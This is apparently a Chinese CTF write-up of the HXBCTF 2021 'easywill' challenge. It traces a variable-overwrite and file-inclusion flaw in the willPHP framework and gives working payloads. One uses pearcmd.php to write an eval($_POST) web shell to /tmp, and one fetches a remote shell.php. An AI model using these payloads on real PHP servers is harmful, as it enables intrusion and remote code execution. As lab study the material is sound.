---
title: 湖湘杯
date: 2021-12-11 14:10:33
tags: 框架
categories: 比赛题目复现
top_img: https://images.wallpaperscraft.com/image/single/sunflowers_solitude_alone_124387_1280x720.jpg
cover: https://images4.alphacoders.com/781/thumbbig-781724.webp
---

## [HXBCTF 2021]easywill

**考点：**

```
1、框架审计

2、利用pearcmd.php包含getshell

3、phpstorm的远程debug
```

启动题目

![在这里插入图片描述](https://img-blog.csdnimg.cn/d96290a391494a569631ba8854abb8a5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

告诉了是利用**willPHP**开发的框架题，还很好心的给出了开发手册和下载链接

对于**框架题**，要注意的有两点：

```
1、本地搭建环境测试

2、查询其开发手册和相关漏洞
```

### 本地环境搭建

所以这里我们先把其下载到本地，本地访问出现以下界面即为成功

```
http://localhost/will
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/e30023525f504adda20deef9a0553ade.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

接着我们将源码粘贴到**controller**下的**IndexController.php**,这里注意要将命名空间中的**home**改成**app**

![在这里插入图片描述](https://img-blog.csdnimg.cn/128cee303a60445fbed2a6a7bb7f0d69.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

现在我们本地的环境就和题目一模一样了，就可以开始在本地调试了

### **远程debug设置**

接下来进行远程debug的设置，我们这里使用的是**phpstudy**和**phpstorm**

我们打开**php.ini**配置文件，在xdebug处进行如下设置

```php
[Xdebug]
zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll
xdebug.collect_params=1
xdebug.collect_return=1
xdebug.auto_trace=On
xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace
xdebug.profiler_enable=On
xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler
xdebug.remote_enable=1
xdebug.remote_host=localhost
xdebug.remote_port=11013   //可随意设置，保持和phpstorm上的端口一致即可
xdebug.remote_handler=dbgp
xdebug.remote_autostart =1
xdebug.idekey="PHPSTORM"  //可随意设置
```

接着设置**phpstorm**

![在这里插入图片描述](https://img-blog.csdnimg.cn/c597a82ccfae446ea4ef7988c9f8d613.png)

在右上角，紫色的这个点开

![在这里插入图片描述](https://img-blog.csdnimg.cn/7e36aaaa88274aeabcce5910a3ac6952.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_13,color_FFFFFF,t_70,g_se,x_16)

名称随意取，IDE健即为上面设置的`xdebug.idekey="PHPSTORM" `

服务器设置：

名称随意取，主机设为127.0.0.1或者localhost

![在这里插入图片描述](https://img-blog.csdnimg.cn/5975f3d4a2324ee6bbe8d4bca1a36e32.png)

然后点击验证进行验证，这里url要改成根目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/50f37989fc754025b965ddb8597f0d1d.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

通过

![在这里插入图片描述](https://img-blog.csdnimg.cn/fa5adeee12bb4cf39e2a1af74b3d4223.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_19,color_FFFFFF,t_70,g_se,x_16)

接下来点击右上角的这个东西就可以开始远程调试了

![在这里插入图片描述](https://img-blog.csdnimg.cn/027a2d91b7434f9fb7d63ca3a8e7cde8.png)

### 题目解析

我们跟踪**assign**函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/5abb1a51625940888b5131ee3565370b.png)

继续跟进assign，进到**helper.php**

```php
function assign($name, $value = null) {
	\wiphp\View::assign($name, $value);//这里调用了View里面的assign方法
```

继续跟进到**View.php**

```php
public static function assign($name, $value = null) {
		if ($name != '') self::$vars[$name] = $value;
	} //这里只是进行了一个判断，并且将$name作为键，$value作为值
```

退回到**helper.php**

再看view函数

```php
function view($file = '', $vars = []) {
	return \wiphp\View::fetch($file, $vars);//调用了View中的fetch方法
```

跟进到**View.php**

```php
public static function fetch($file = '', $vars = []) {
		if (!empty($vars)) self::$vars = array_merge(self::$vars, $vars);			
		$viewfile = self::getViewFile($file);
		if (file_exists($viewfile)) {
			array_walk_recursive(self::$vars, 'self::parseVars'); //处理输出
			define('__RUNTIME__', round((microtime(true) - START_TIME) , 4));	
			Template::render($viewfile, self::$vars);
		} else {
			App::halt($file.' 模板文件不存在。');
		}
	}
```

跟进**render**，进入**Tempate.php**

```php
public static function renderTo($viewfile, $vars = []) {
		$m = strtolower(__MODULE__);
		$cfile = 'view-'.$m.'_'.basename($viewfile).'.php';
		if (basename($viewfile) == 'jump.html') {
			$cfile = 'view-jump.html.php';
		}
		$cfile = PATH_VIEWC.'/'.$cfile;
		if (APP_DEBUG || !file_exists($cfile) || filemtime($cfile) < filemtime($viewfile)) {
			$strs = self::compile(file_get_contents($viewfile), $vars);
			file_put_contents($cfile, $strs);
		}
		extract($vars); //将键值赋值给变量
		include $cfile;
	}
```

可以看到存在变量覆盖以及文件包含

所以这里构造

```php
name=cfile & value=想写入的内容 即可形成文件包含漏洞
```

当我们开启远程debug后我们测试**?name=cfile&value=AAAA**，可以看到**$cfile=AAAA**

所以这里可以写入shell到tmp目录，关于**pearcmd.php**，可见[详解](https://blog.csdn.net/rfrder/article/details/121042290)

**出网的利用姿势**

```php
pear install -R /tmp http://xxxxxxx/shell.php
```

**不出网的利用姿势**

```php
pear -c /tmp/.feng.php -d man_dir=<?=eval($_POST[0]);?> -s
```

所以最终**payload**

```php
?name=cfile&value=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[0])?>+/tmp/aa.php
```

这里要千万注意，不能直接到url里构造，否则`<>`会被url编码，我们写的shell就不会被解析了，所以我们要移步到burp中写

![在这里插入图片描述](https://img-blog.csdnimg.cn/f22ca4a159254ed5b073443bc39e0dc7.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

写入成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/d171e80e41e84c878b57f44be693177d.png)

接着我们尝试执行phpinfo查看是否真正写入成功

```
http://53bb636f-9fbc-43f2-bd4a-be7c1efff83a.node4.buuoj.cn:81/?name=cfile&value=/tmp/aa.php
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/3c8bc274784547b0a56c7a80e0290ca0.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到，的确成功了，接着查看根目录下的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/7fa9e3dc66a248ac88fca82df49ebbd9.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

看到flag文件，打开即可获得flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/d89f434ea3844de187f20b2953701bea.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)